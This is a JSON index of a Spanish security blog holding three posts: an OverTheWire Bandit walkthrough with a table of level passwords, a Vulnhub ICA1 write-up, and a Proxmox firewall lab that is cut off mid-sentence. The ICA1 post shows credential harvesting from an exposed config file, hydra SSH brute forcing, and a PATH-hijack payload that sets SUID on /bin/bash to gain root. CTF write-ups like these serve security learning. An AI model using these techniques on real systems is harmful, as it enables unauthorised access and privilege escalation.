[
  
  {
    "title": "OverTheWire - Bandit Walkthrough",
    "url": "/posts/OverTheWireBandit/",
    "categories": "OverTheWire",
    "tags": "OverTheWire, Bandit, CTF",
    "date": "2023-12-06 00:00:00 +0100",
    





    
    "snippet": "En este post vamos a realizar todos los niveles del CTF OverTheWire: bandit que actualmente van desde el 0 hasta el 33.Nivel 0:Para empezar el primer nivel debemos conectarnos por SSH a la siguient...",
    "content": "En este post vamos a realizar todos los niveles del CTF OverTheWire: bandit que actualmente van desde el 0 hasta el 33.Nivel 0:Para empezar el primer nivel debemos conectarnos por SSH a la siguiente direccion ‘bandit.labs.overthewire.org’ y mediante el usuario bandit0, contraseña bandit0 y puerto 2220.Con el siguiente oneliner podemos conectarnos:sshpass -p 'bandit0' ssh bandit0@bandit.labs.overthewire.org -p 2220En el directorio donde nos encontramos hay archivo llamado readme que contiene la contraseña de bandit1Nivel 1 -&gt; 2Salimos de la sesión ssh de bandit0 y con el siguiente comando nos conectamos como bandit1:sshpass -p 'NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL' ssh bandit1@bandit.labs.overthewire.org -p 2220En el directorio actual existe un archivo llamado literalmente “-“, como vemos, si le hacemos un simple cat en principio no nos dejará, ya que la terminal piensa que le vamos a asignar un parámetro al comando.Os dejo las diferentes formas que tenemos de ver el contenido del archivo:Nivel 2 -&gt; 3Al conectarnos como bandit2 nos damos cuenta de que dentro del directorio actual hay un archivo llamado “spaces in this file”, para ver el contenido simplemente escribiremos “cat s” y pulsamos la tecla Tab, o escribimos cat spaces*.Nivel 3 -&gt; 4La contraseña para el siguiente nivel se encuentra en un archivo oculto dentro del directorio inhere, los archivos ocultos en sistemas Linux empiezan con un “.”.Para  ver los archivo ocultos usamos el comando ls -la:Con este comando lo hariamos de una forma mas “certera”, ya que buscamos los archivos con el comando find y filtramos para que solo nos muestre el archivo .hidden y le hacemos un cat de forma paralela con el comando xargs:Nivel 4 -&gt; 5La contraseña para el siguiente nivel se encuentra en el único archivo legible en el directorio inhere:Con el comando find buscaremos los archivos legibles y le haremos un file de forma paralela con xargs, para ver el tipo de cada archivoComo vemos, hay un archivo que es de tipo ASCII text, vamos a mostrar su contenido, con el siguiente oneliner:Nivel 5 -&gt; 6La contraseña para el siguiente nivel se encuentra en un archivo dentro del directorio inhere y tiene las siguientes propiedades:  legible por humanos  1033 bytes de tamaño  No es ejecutableSi buscamos por archivo legibles, no saldrán muchos:Pero si le añadimos el parámetro -size y le pasamos que el archivo tiene un tamaño de 1033 bytes (se representa con la letra “c” en find), solo nos devuelve un archivo:Vamos a mostrar su contenido:(Borramos los espacios con el comando tr ya que en la salida hay muchos espacios)Nivel 6 -&gt; 7La contraseña para el siguiente nivel se encuentra en algún lugar del servidor y tiene las siguientes propiedades:  El usuario propietario es bandit7.  El grupo propietario es bandit6.  Tiene 33 bytes de tamaño.Usaremos el comando find como en el nivel anterior para buscar en el sistema archivo con usuario propietario bandit7, grupo propietario bandit6, y 33 bytes de tamaño, y la hacemos un cat:Nivel 7 -&gt; 8La contraseña para el siguiente nivel se encuentra dentro de archivo data.txt al lado de la palabra millionth:Vamos a filtrar para que solo nos muestre la contraseña:Nivel 8 -&gt; 9La contraseña para el siguiente nivel se encuentra en el archivo data.txt y está en la línea que ocurre una vez.Con el comando sort y uniq podremos ver la línea que solo está escrita una vez en el archivo:Nivel 9 -&gt; 10La contraseña para el siguiente nivel se encuentra en el archivo data.txt en una de las pocas cadenas legibles, al lado de varios carateres ‘=’, con el comando grep buscamos caracteres “=” dentro del archivo y luego imprimimos la última línea y filtramos por la última palabra de la línea on awk:Nivel 10 -&gt; 11La contraseña para el siguiente nivel se encuentra en el archivo data.txt, el cuál contiene texto codificado en base64, usaremos el comando base64 -d para decodificar el contenido del archivo:Nivel 11 -&gt; 12Este nivel ya es un poco más complejo la contraseña se encuentra en el archivo data.txt, donde las letras se han girado 13 posiciones, un cifrado llamado ROT13.En este nivel usaremos el comando tr para manipular el texto y dar con la clave:Nivel 12 -&gt; 13Tal cuál vamos subiendo de nivel, la cosa se pone más complicada, en este nivel la contraseña se encuentra en el archivo data.txt, el cuál es un volcado hexadecimal de un archivo comprimido repetidamente.Para trabajar más cómodos, copiaremos el archivo y nos lo llevaremos a nuestra máquina.Y gracias al comando xxd pasaremos el volcado decimal a un archivo binario, y con sponge lo guarda todo al archivo data:Como vemos el contenido es ilegible, ya que es un comprimido, lo podemos comprobar con el comando file:El nivel se basa en ir descomprimiendo archivo hasta dar con el que es de tipo ASCII text contiene la contraseña, pero os dejaré un script el cuál os automatiza todas las descompresiones:#!/bin/bashctrl_c(){  echo -e \"\\n\\n[!] Saliendo...\\n\"  exit 1}trap ctrl_c SIGINTprimercomprimido=\"data\"descomprimir=\"$(7z l $primercomprimido | tail -n 3 | head -n 1 | awk 'NF{print $NF}')\"7z x $primercomprimido &amp;&gt;/dev/nullwhile [ $descomprimir ]; do  echo -e \"\\n[+] Nuevo archivo descomprimido: $descomprimir\"  7z x $descomprimir &amp;&gt;/dev/null  descomprimir=\"$(7z l $descomprimir 2&gt;/dev/null | tail -n 3 | head -n 1 | awk NF'{print $NF}')\"doneEl script nos ahorra la reiterada tarea de ir descomprimiendo cada archivo, la variable primercomprimido se debe llamar como el archivo que iba después de sponge.Ejecutamos el script y el último archivo que fue descomprimido fue data8.bin que contenía a data9.bin el cual es legible y contiene la contraseña.Nivel 13 -&gt; 14La contraseña para el siguiente nivel se encuentra en el archivo etc/bandit_pass/bandit14 y puede ser leído por el usuario bandit14, no necesitamos conseguir la contraseña, pero si acceder al siguiente nivel con una clave privada SSH, la clave se encuentra en el directorio actual y se llama sshkey.private:Con el comando ssh -i podremos usar esta clave privada para conectarnos como el usuario bandit14:Tras ejecutar este comando, estaremos como el usuario bandit14.Y podremos ver la contraseña del usuario.Nivel 14 -&gt; 15En este nivel nos piden que enviemos la contraseña de bandit14 el puerto 30000 de localhost, usaremos los comandos cat y ncMostramos el contenido del archivo /etc/bandit_pass/bandit14 que contiene la contraseña del usuario y lo enviamos el puerto 30000 de localhost.Nivel 15 -&gt; 16Este nivel es similar al anterior, deberemos enviar la contraseña del nivel actual al puerto 30001 de localhost mediante cifrado SSL.Usaremos el comando openssl con el parámetro s_client para conectarnos al puerto 30001 y enviaremos la contraseña:Una vez puesto este comando nos pedirá la contraseña:La pegamos y nos devuelve la contraseña del siguiente nivel:Nivel 16 -&gt; 17La contraseña para el siguiente nivel se puede recuperar enviando la contraseña del nivel a un puerto en localhost entre el 31000 y el 32000.  y está usando SSL para la conexión:Primero usaremos el comando nmap para escanear los puertos de la máquina en ese rango:Así que ahora probaremos puerto por puerto, el siguiente comando openssl s_client -connect localhost:&lt;puerto&gt; hasta recibir la respuesta correcta:El puerto 31790 nos ha devuelto una clave privada, usaremos esta misma para conectarnos al usuario bandit17.Vamos a crear un directorio temporal para poder crear archivos.Y vamos a volcar esa clave privada en el archivo id_rsaAntes de conectarnos debemos darle los permisos 600 al archivo ya que de otra forma no nos permitirá conectarnosNivel 17 -&gt; 18Para descubrir la contraseña deberemos descubrir la única línea que se ha cambiado entre los archivos passwords.old y passwords.new.En este nivel usaremos el comando diff que nos permite comparar línea por línea archivos para ver que líneas les diferencian.Como vemos, nos muestra que línea diferencia a un archivo de otro al contraseña del siguiente nivel es el segundo resultado.Nivel 18 -&gt; 19La contraseña se encuentra en el archivo readme, el problema es que algo ha sido modificado en el archivo .bashrc del usuario y no expulsa cuando nos conectamos, pero ssh nos permite ejecutar comandos recién nos conectamos, con el parámetro commandAsí que usaremos el comando bash para poder lanzarnos una consola.Y mediante este comando hemos podido ejecutar una bash como ese usuario.Nivel 19 -&gt; 20En el siguiente nivel nos encontramos un binario llamado bandit20-do que tiene permisos SUID, esto quiere decir que bandit19 puede ejecutar este binario como bandit20 de forma temporal.Esto nos permite, entre muchas cosas, tanto mostrar la contraseña del usuario  bandit20, como lanzarnos una bash como ese usuario.Nivel 20 -&gt; 21Al conectarnos a la máquina, nos damos cuenta que existen un binario llamado suconnect el cual tiene permisos SUID y el propietario es bandit21:Este binario establece una conexión con el host local en el puerto que le especifiquemos como argumento, lee una línea que le pasemos la compara con la contraseña de bandit20, si es correcta nos devolverá la contraseña de bandit21.Este nivel usaremos dos consolas con la sesión ssh de bandit20 iniciada, en una nos pondremos en escucha por el puerto 4646, en la otra usaremos el binario para conectarnos a ese puerto.En la ventana de abajo, si pegamos la contraseña, nos devolverá otra, que corresponde a bandit21Nivel 21 -&gt; 22En este nivel empezamos a jugar con tareas cron, que básicamnte son tareas que se puede programar para que se ejecuten periódicamente en el sistema.Como vemos en el directorio /etc/cron.d/ tenemos varios archivos, el que nos interesa es cronjob_bandit22.Si mostramos su contenido, podemos ver que se está ejecutando un script llamado cronjob_bandit22.sh de forma periódica (en este caso cada minuto)Y este es el contenido del script, básicamente le está asignando unos permisos al archivo y luego está volcando la contraseña de bandit22 en él.Mostramos el contenido con el comando cat y ya tenemos la contraseña.Nivel 22 -&gt; 23En este nivel también se están usando tareas cron.En este caso nos interesa cronjob_bandit23, ya que es el siguiente nivel.Este scripts crea una variable myname mediante esa crea un hash md5 y crea archivo donde vuelca la contraseña de lo que valga en este caso whoami, vamos a ver como vulnerar esto:Si ejecutamos el script, obtendremos la contraseña de bandit22, ya que es lo que devuelve el comando whoami.Así que copiaremos el comando que se almacena en la variable mytarget y cambiaremos el valor de la variable myname por bandit23, nos devuelve un hash, que es el nombre de archivo que contiene la contraseña de bandit23:Nivel 23 -&gt; 24Otro nivel con tareas cron:Este script básicamente lo que hace es ejecutar todo lo que se encuentre en la ruta /var/spool/bandit24/foo como bandit24 así que ya más o menos tenemos un idea de lo que podemos hacer para conseguir la contraseña.Primero he creado un directorio temporal con mktemp.Y he creado un script el cuál nos vuelca la contraseña de bandit24 en el directorio actual, en un archivo llamado bandit24pass.txt.El siguiente paso será dar permisos de lectura y ejecución al script para que bandit24 lo pueda ejecutar y permiso 777 al directorio temporal.Copiamos el script a la ruta que veíamos en la tarea cron.Si ejecutamos reiteradamente cada segundo ls -l con el comando watch -n 1 ls -l veremos que al pasar un minuto aparece el archivo.Y el archivo contiene la contraseña de bandit24.Nivel 24 -&gt; 25En este nivel tenemos un servicio (daemon) escuchando en el puerto 30002, y nos devolverá la contraseña de bandit25 si le pasamos la contraseña de bandit24 y un PIN secreto de 4 dígitos, no hay forma de averiguar ese PIN así que deberemos hacer fuerza bruta.Mediante este script creamos un archivo llamado combinaciones.txt el cuál tiene conjunto de contraseña:PIN para realizar la fuerza bruta.Y con el siguiente comando comenzaremos a realizar fuera bruta enviando ese archivo hacia el puerto 30002 de localhost hasta dar con la combinación correcta.Nivel 25 -&gt; 26En este nivel nos dicen que debería ser fácil conectarnos como bandit26, pero su shell no es /bin/bash, tenemos que descubrir que es y como funciona y como vulnerarlo.Tenemos su clave privada, pero de alguna forma, nos expulsa al cconectarnos:Si buscamos que tipo de shell tiene bandit26, vemos que tiene una llamada showtext, vamos a ver que es:Este script causa que cuando nos conectamos, ejecuta un more hacia un archivo llamado text.txt que es el banner que nos muestra al conectarnos, y luego nos expulsa.Para conectarnos como bandit26, tenemos que aprovechar el more, para ello debemos conectarnos con la clave privada y hacer la terminal pequeña hasta que nos salga algo así, estamos dentro del comando more que se ejecutaba al conectarnos a bandit26.Pulsamos la tecla v para poder interactuar con more y escribiremos lo siguiente, que nos mostrará la contraseña de bandit26.Pero en este caso nos interesa ‘spawnearnos’ una shell como bandit26, lo haremos con este comando.Y ahora escribimos :shell.Ya tenemos una shell como bandit26.Nivel 26 -&gt; 27Este nivel es más sencillo, tenemos un ejecutable con SUID llamado bandit27-do, el cuál ejecuta comandos como bandit27, ya sabemos como pasarnos esto:Ya tenemos la contraseña de bandit27.Nivel 27 -&gt; 28Ahora vamos a jugar con repositorios de git, este caso está en ssh://bandit27-git@localhost/home/bandit27-git/repo en el puerto 2220, la contraseña para el usuario bandit27-git es la misma que para bandit27.Nos creamos un directorio temporal y ejecutamos este comando para clonarnos el repositorio, le pasamos la contraseña:Y nos lo clona.Nivel 28 -&gt; 29En este nivel seguimos con repositorios, pero en este vamos a jugar con versiones.Como vemos el campo no está.Con log podemos ver todos los cambios y commits han realizado en este repositorio, vemos que en el segundo se agregó datos que faltaban, y en el último ‘arreglaron la fuga de datos’, así que vamos a volver a la segunda versión.Usamos el comando git checkout para esto, y ya vemos la contraseña en el archivo README.md.Nivel 29 -&gt; 30Otro nivel usando repositorios, pero en este caso jugaremos con las branch o ramas en Git.Nos clonamos el repositorio de bandit29,En este nivel no nos servirá cambiar de versión del repositorio.Así que usamos el comando git branch que nos permite crear, listar o eliminar ramas en Git, entre todas, nos llama la atención la rama de dev.Así que usamos el comando git checkout dev para cambiarnos a esa rama, y ya podemos ver la contraseña.Nivel 30 -&gt; 31En este nivel usaremos las tags de git para dar con la contraseña.Nos creamos el directorio temporal y nos clonamos el repositorio como en los ejercicios anteriores.En el README.md no podemos ver nada de valorTampoco en los logs ni en las ramas.Si usamos el comando git tag para listar las etiquetas podemos ver una que se llama secret.Y con el comando git show secret podemos mostrar esa etiqueta, que es la contraseña para el siguiente nivel.Nivel 31 -&gt; 32En este nivel consiste en enviar con git push un archivo con un contenido en concreto para que nos devuelva la contraseña del siguiente nivel.Como vemos, nos pide que creemos un archivo llamado key.txt con el contenido May I come in? y enviar como la rama master.Así que creamos el archivo, le agregamos el contenido y hacemos un git add, pero como vemos, existe un archivo llamado .gitignore el cuál no nos está permitiendo añadir el archivo.No nos permite añadir todo lo que sea .txt, así que lo borramos.Ahora si, añadimos el archivo y le agregamos un commit, y le hacemos un git push -u origin master.Y nos devuelve la contraseña para el siguiente nivel.Nivel 32 -&gt; 33 (Final)Último nivel.Al conectarnos, nos muestran un mensaje de que estamos en una UPPERCASE SHELL.Y todo lo que escribamos se convierte en mayúsculas, así que no podremos ejecutar ningún comando.Como sabemos, la variable $0 referencia a la shell o script actual que se está ejecutando, así que si escribimos esto en la terminal, ya que estamos ejecutando bash, conseguimos ejecutarlo y tener una consola.Y por aquí termina el post de hoy, muy interesante para empezar a trastear con Linux y en el mundo del Hacking, espero que os haya gustado y lo hayáis disfrutado, nos vemos en el siguiente, ¡un saludo :)!.Contraseñas de cada nivel            Usuario      Contraseña                  bandit0      bandit0              bandit2      rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi              bandit3      aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG              bandit4      2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe              bandit5      lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR              bandit6      P4L4vucdmLnm8I7V7jG1ApGSfjYKqJU              bandit7      z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S              bandit8      TESKZC0XvTetK0S9xNwm25STk5iWrBvP              bandit9      EN632PlfYiZbn3PhVK3XOGSlNInNE00t              bandit10      G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s              bandit11      6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM              bandit12      JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv              bandit13      wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw              bandit14      fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq              bandit15      jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt              bandit16      JQttfApK4SeyHwDlI9SXGR50qclOAil1              bandit17      VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e              bandit18      hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg              bandit19      awhqfNnAbc1naukrpqDYcF95h7HoMTrC              bandit20      VxCazJaVykI6W36BkBU0mJTCM8rR95XT              bandit21      NvEJF7oVjkddltPSrdKEFOllh9V1IBcq              bandit22      WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff              bandit23      QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G              bandit24      VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar              bandit25      p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d              bandit26      c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1              bandit27      YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS              bandit28      AVanL161y9rsbcJIsFHuw35rjaOM19nR              bandit29      tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S              bandit30      xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS              bandit31      OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt              bandit32      rmCBvG56y58BXzv98yZGdO7ATVL5dW8y              bandit33      odHo63fHiFqcWWJG9rLiLDtPm45KzUKy      "
  },
  
  {
    "title": "Máquina ICA1 - Vulnhub",
    "url": "/posts/Vulnhub-ICA1/",
    "categories": "Vulnhub",
    "tags": "MySQL, PathHijacking",
    "date": "2023-09-15 00:00:00 +0200",
    





    
    "snippet": "Link de la máquina:Según información de nuestra red de inteligencia, el ICA está trabajando en un proyecto secreto. Necesitamos saber cuál es el proyecto. Una vez que tengas los datos de acceso, en...",
    "content": "Link de la máquina:Según información de nuestra red de inteligencia, el ICA está trabajando en un proyecto secreto. Necesitamos saber cuál es el proyecto. Una vez que tengas los datos de acceso, envíanoslo. Colocaremos una puerta trasera para acceder al sistema más adelante. Simplemente concéntrate en cuál es el proyecto. Probablemente tendrñas que pasar por varias capas de seguridad. La Agencia tiene plena confianza en que completará con éxito esta misión.ReconocimientoUsaremos nmap para ver los puertos (servicios) abiertos y expuestos de la máquina, lo exportaremos en formato “Grepeable” al archivo allPorts:nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;IP&gt; -oG allPortsEste será el archivo resultante:# Nmap 7.93 scan initiated Mon Sep 11 17:00:31 2023 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.28.121# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 192.168.28.121 ()\tStatus: UpHost: 192.168.28.121 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///, 33060/open/tcp//mysqlx///# Nmap done at Mon Sep 11 17:00:44 2023 -- 1 IP address (1 host up) scanned in 13.23 secondsComo vemos tenemos los puertos 22(SSH),80(HTTP),3306(MySQL),33060(MySQLx) expuestosMediante la utilidad extractPorts vamos a copiar todos los puertos a la clipboard y vamos a seguir con el reconocimiento:$ extractPorts allPorts[*] Extracting information...     [*] IP Address: 192.168.28.121    [*] Open ports: 22,80,3306,33060[*] Ports copied to clipboardY con nmap vamos a ver la versión de cada servicio expuesto en la máquina y lo exportaremos en formato Nmap al archivo targeted:nmap -sCV -p22,80,3306,33060 192.168.28.121 -oN targetedEnumeraciónCon la herramienta whatweb vamos a ver que tecnologías está utilizando la página web que está corriendon en el puerto 80❯ whatweb http://192.168.28.121http://192.168.28.121 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.28.121], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]Entre otras cosas, nos damos cuenta de que la página está usando qdPM (Es una herramienta de gestión de proyectos basada en web)(Imagen de la página web)ExplotaciónVemos que la versión de qdPM es la 9.2, con una pequeña búsqueda con searchsploit vemos que esa versión tiene registradas dos vulnerabilidades:$ searchsploit qdPM 9.2------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title                                                                                                                                        |  Path------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                          | php/webapps/50854.txtqdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                        | php/webapps/50176.txt------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No ResultsEn este caso vamos a elegir la segunda (Password Exposure), que permitirá descargarnos un archivo yml con la contraseña de acceso a la base de datos, la ruta es http://&lt;website&gt;/core/config/databases.yml$ cat databases.yml  all:  doctrine:    class: sfDoctrineDatabase    param:      dsn: 'mysql:dbname=qdpm;host=localhost'      profiler: false      username: qdpmadmin      password: \"&lt;?php echo urlencode('UcVQCMQk2STVeS6J') ; ?&gt;\"      attributes:        quote_identifier: true    Usuario: qdpmadminContraseña: UcVQCMQk2STVeS6JCon el siguiente comando accederemos a la base de datos$ mysql -uqdpmadmin -h &lt;IP&gt; -pUcVQCMQk2STVeS6JDentro encontraremos una base de datos llamada staff la cuál tiene tres tablas (department, login, user), ahí encontraremos las credenciales codificadas en base64Una vez tengamos una lista con los usuarios y las contraseñas usaremos la herramienta hydra para hacer fuerza bruta por SSH a la máquina víctima.$ for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords$ hydra -L users -P passwords ssh://192.168.28.121Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-11 17:51:38[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task[DATA] attacking ssh://192.168.28.121:22/[22][ssh] host: 192.168.28.121   login: travis   password: DJceVy98W28Y7wLg[22][ssh] host: 192.168.28.121   login: dexter   password: 7ZwV4qtg42cmUXGX1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-11 17:51:44Ha encontrado nos usuarios los cuáles podemos acceder mediante SSH, travis y dexterEscalada de privilegiosCuando accedemos con el usuario dexter, encontramos esta nota:dexter@debian:~$ cat note.txt It seems to me that there is a weakness while accessing the system.As far as I know, the contents of executable files are partially viewable.I need to find out if there is a vulnerability or not.dexter@debian:~$ Mediante el comando find vamos a hacer una búsqueda para ver si hay ejecutables vulnerables en el sistema:dexter@debian:~$ find / -perm -4000 2&gt;/dev/null/opt/get_access/usr/bin/chfn/usr/bin/umount/usr/bin/gpasswd/usr/bin/sudo/usr/bin/passwd/usr/bin/newgrp/usr/bin/su/usr/bin/mount/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helperdexter@debian:~$Nos llama la atención el primer resultado, /opt/get_access, vamos a echarle un vistazoAl ejecutarlo nos sale esto:dexter@debian:~$ /opt/get_access   ############################  ########     ICA     #######  ### ACCESS TO THE SYSTEM ###  ############################  Server Information:   - Firewall:\tAIwall v9.5.2   - OS:\tDebian 11 \"bullseye\"   - Network:\tLocal Secure Network 2 (LSN2) v 2.4.1All services are disabled. Accessing to the system is allowed only within working hours.dexter@debian:~$Usaremos el comando strings para ver las cadenas de caracteres imprimibles que contenga el archivo /opt/get_access$ string /opt/get_access_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu/UH[]A\\A]A^A_cat /root/system.infoCould not create socket to access to the system.All services are disabled. Accessing to the system is allowed only within working hours.;*3$\"Nos llama la atención la línea en la que pone “cat /root/system.info” y sabemos que el ejecutable está usando el comando cat de forma relativa, lo que nos permite hacer una PATH HIJACKINGEl primer paso será dirigirnos a un directorio donde tengamos permisos de escritura (en mi caso /tmp y vamos a crear un ejecutable llamado cat)Contenido del script:#!/bin/bashchmod u+s /bin/bashEn él le estamos dando permiso SUID a /bin/bashAhora vamos a modificar el PATH de la siguiente forma:export PATH=/tmp:$PATHAñadiremos la ruta /tmp para que el sistema ejecute tome en cuanta los ejecutables de esa rutaSi volvemos a ejecutar /opt/get_access veremos lo siguiente:dexter@debian:/tmp$ /opt/get_access All services are disabled. Accessing to the system is allowed only within working hours.dexter@debian:/tmp$ ls -l /bin/bash-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bashdexter@debian:/tmp$Una vez /bin/bash tenga el permiso SUID, con el comando bash -p tendremos acceso al usuario rootdexter@debian:/tmp$ bash -pbash-5.1#Espero que te haya gustado esta primera máquina de Vulnhub llamada ICA1 :), !Nos vemos en la siguiente¡"
  },
  
  {
    "title": "Laboratorio con Firewall en Proxmox",
    "url": "/posts/Laboratorio-Proxmox/",
    "categories": "Proxmox",
    "tags": "Virtualización, Proxmox",
    "date": "2023-05-18 00:00:00 +0200",
    





    
    "snippet": "En esta práctica vamos a configurar dos máquinas Ubuntu Linux, una será el cliente y la otra actuará como Firewall.Esquema de la prácticaEl esquema consiste en:  Una máquina que servirá de Firewall...",
    "content": "En esta práctica vamos a configurar dos máquinas Ubuntu Linux, una será el cliente y la otra actuará como Firewall.Esquema de la prácticaEl esquema consiste en:  Una máquina que servirá de Firewall que será un contenedor Ubuntu en nuestro servidor Proxmox con dos tarjetas de red, la externa tendrá la IP 192.168.28.200 y la interna la IP 192.168.14.1.  Dentro de la red también habrá un dispositivo Switch con la IP 192.168.14.100.  Un cliente que será otro contenedor Ubuntu y tendrá la IP 192.168.14.10.Creando Switch en ProxmoxNos dirigimos a nuestro nodo principal y a System &gt; Network, pulsamos en create y a Linux Bridge.Y le asignamos la IP 192.168.14.100.Nos dirigimos a nuestro “Storage” del nodo principal y nos descargamos una versión de Ubuntu, en mi caso me he descargado la Ubuntu 22.04 Jammy.Una vez creado los contenedores, vamos a ver su configuración de red.Configuración de red del contenedor FirewallConfiguración de red del contenedor UbuntuClienteProbando conectividad en las máquinasUna vez arrancados los dos contenedores, vamos a empezar por hacer ping desde ClienteUbuntu hasta el Switch que tiene la IP 192.168.14.100.root@ClienteUbuntu:~# ping -c 4 192.168.14.100PING 192.168.14.100 (192.168.14.100) 56(84) bytes of data.64 bytes from 192.168.14.100: icmp_seq=1 ttl=64 time=0.058 ms64 bytes from 192.168.14.100: icmp_seq=2 ttl=64 time=0.048 ms64 bytes from 192.168.14.100: icmp_seq=3 ttl=64 time=0.063 ms64 bytes from 192.168.14.100: icmp_seq=4 ttl=64 time=0.044 ms--- 192.168.14.100 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3075msrtt min/avg/max/mdev = 0.044/0.053/0.063/0.007 msroot@ClienteUbuntu:~#También comprobaremos que existe conectividad entre ClienteUbuntu y las dos patas del Firewall, que sus IPs son 192.168.14.1 y 192.168.28.200.root@ClienteUbuntu:~# ping -c 2 192.168.14.1PING 192.168.14.1 (192.168.14.1) 56(84) bytes of data.64 bytes from 192.168.14.1: icmp_seq=1 ttl=64 time=0.052 ms64 bytes from 192.168.14.1: icmp_seq=2 ttl=64 time=0.050 ms--- 192.168.14.1 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 0.050/0.051/0.052/0.001 msroot@ClienteUbuntu:~# ping -c 2 192.168.28.200PING 192.168.28.200 (192.168.28.200) 56(84) bytes of data.64 bytes from 192.168.28.200: icmp_seq=1 ttl=64 time=0.050 ms64 bytes from 192.168.28.200: icmp_seq=2 ttl=64 time=0.083 ms--- 192.168.28.200 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1024msrtt min/avg/max/mdev = 0.050/0.066/0.083/0.016 msroot@ClienteUbuntu:~# La máquina Firewall tiene conectividad con la máquina ClienteUbuntu, también con el Switch, y conectividad con el exterior.root@Firewall:~# ping -c 2 192.168.14.10PING 192.168.14.10 (192.168.14.10) 56(84) bytes of data.64 bytes from 192.168.14.10: icmp_seq=1 ttl=64 time=0.078 ms64 bytes from 192.168.14.10: icmp_seq=2 ttl=64 time=0.050 ms--- 192.168.14.10 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1003msrtt min/avg/max/mdev = 0.050/0.064/0.078/0.014 msroot@Firewall:~# ping -c 2 192.168.14.100PING 192.168.14.100 (192.168.14.100) 56(84) bytes of data.64 bytes from 192.168.14.100: icmp_seq=1 ttl=64 time=0.066 ms64 bytes from 192.168.14.100: icmp_seq=2 ttl=64 time=0.049 ms--- 192.168.14.100 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 0.049/0.057/0.066/0.008 msroot@Firewall:~# ping -c 2 8.8.8.8 PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=248 time=12.6 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=248 time=14.7 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 12.583/13.647/14.712/1.064 msroot@Firewall:~# Configuración y activación de IptablesEl siguiente paso será configurar y activar Iptables, pero antes de nada, ¿Qué carajos es Iptables?Iptables básicamente es un programa que viene por defecto en sistemas Linux y nos permite configurar el firewall o cortafuegos.  Antes de nada vamos a hacer una configuración previa.Listamos las interfaces que tiene nuestra máquina Firewall en la ruta /sys/class/net/.rootFirewall:~# ls /sys/class/net/eth0  lo  net14root@Firewall:~# @Ahora vamos a habilitar el reenvío de paquetes en el Firewall, para que actue como Router.Se hace con el siguiente comando:root@Firewall:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forwardroot@Firewall:~# Ahora si hacemos ping desde la máquina ClienteUbuntu hacia una máquina de nuestra red local, debería funcionar.root@ClienteUbuntu:~# ping -c 2 192.168.28.108PING 192.168.28.108 (192.168.28.108) 56(84) bytes of data.64 bytes from 192.168.28.108: icmp_seq=1 ttl=64 time=158 ms64 bytes from 192.168.28.108: icmp_seq=2 ttl=64 time=56.4 ms--- 192.168.28.108 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 56.433/107.326/158.220/50.893 msroot@ClienteUbuntu:~#Pero esto que hemos hecho no se queda de forma permanente, cuando reiniciemos el sistema dejará de funcionar.Para ello, debemos editar el 